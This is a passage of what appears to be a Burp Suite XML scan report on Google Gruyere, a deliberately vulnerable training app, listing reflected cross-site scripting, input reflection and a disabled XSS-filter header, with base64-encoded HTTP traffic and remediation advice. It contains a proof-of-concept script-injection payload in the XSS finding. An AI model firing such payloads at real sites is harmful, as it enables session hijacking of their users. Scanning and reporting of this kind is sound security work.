kZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+Cgo8aDI+R3J1eWVyZTogTmV3IFNuaXBwZXQ8L2gyPgoKPGRpdiBjbGFzcz0nY29udGVudCc+CjxoMz5BZGQgYSBuZXcgc25pcHBldC48L2gzPgoKCgo8ZGl2IHN0eWxlPSd3aWR0aDo2MDAnPgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQyJz4KPHRleHRhcmVhIG5hbWU9J3NuaXBwZXQnIHJvd3M9JzUnIHN0eWxlPSd3aWR0aDoxMDAlJz48L3RleHRhcmVhPgo8YnI+Cjx0YWJsZSBzdW1tYXJ5PScnIHN0eWxlPSd3aWR0aDoxMDAlJz4KPHRyPgo8dGQgYWxpZ249J2xlZnQnIHZhbGlnbj0ndG9wJz4KICA8aT5MaW1pdGVkIEhUTUwgaXMgbm93IHN1cHBvcnRlZCBpbiBzbmlwcGV0cyAoZS5nLiwgJmx0O2ImZ3Q7LCAmbHQ7aSZndDssCiAgZXRjLikhPC9pPgo8L3RkPgo8dGQgYWxpZ249J3JpZ2h0JyB2YWxpZ249J3RvcCc+CiAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J1N1Ym1pdCc+CjwvdGQ+CjwvdHI+CjwvdGFibGU+CjwvZm9ybT4KPC9kaXY+CjwvYm9keT4KCjwvaHRtbD4KCg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>9205533722716161024</serialNumber>
    <type>2097920</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newsnippet.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newsnippet.gtl [URL path filename]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the HTML document as plain text between tags. The payload <b>z4mdy&lt;script&gt;alert(1)&lt;/script&gt;ri8qj</b> was submitted in the URL path filename. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGx6NG1keSUzY3NjcmlwdCUzZWFsZXJ0KDEpJTNjL3NjcmlwdCUzZXJpOHFqIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYzAyOWQ5MWM4NDMxOGVjZmZlYzlmYzM5NzVkOWNhZTUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0Mjo1OCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY3NA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL25ld3NuaXBwZXQuZ3RsejRtZHk8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+cmk4cWo8L2Rpdj4KCgo8L2JvZHk+Cgo8L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>15387450333130752</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newsnippet.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newsnippet.gtl [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGxsdHFleGI5ZnFjIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogOTkyMzllMGUxZDAwZGM4MTZhMmI0YzNjM2JkNjk0MzgNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0Mjo0MSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY1OA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPlVucmVjb2duaXplZCBmaWxlIHR5cGUgKC9uZXdzbmlwcGV0Lmd0bGx0cWV4YjlmcWMpLjwvZGl2PgoKCjwvYm9keT4KCjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>9086073725750153216</serialNumber>
    <type>5245360</type>
    <name><![CDATA[Browser cross-site scripting filter disabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/saveprofile]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/saveprofile]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc2F2ZXByb2ZpbGUgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld2FjY291bnQuZ3RsDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
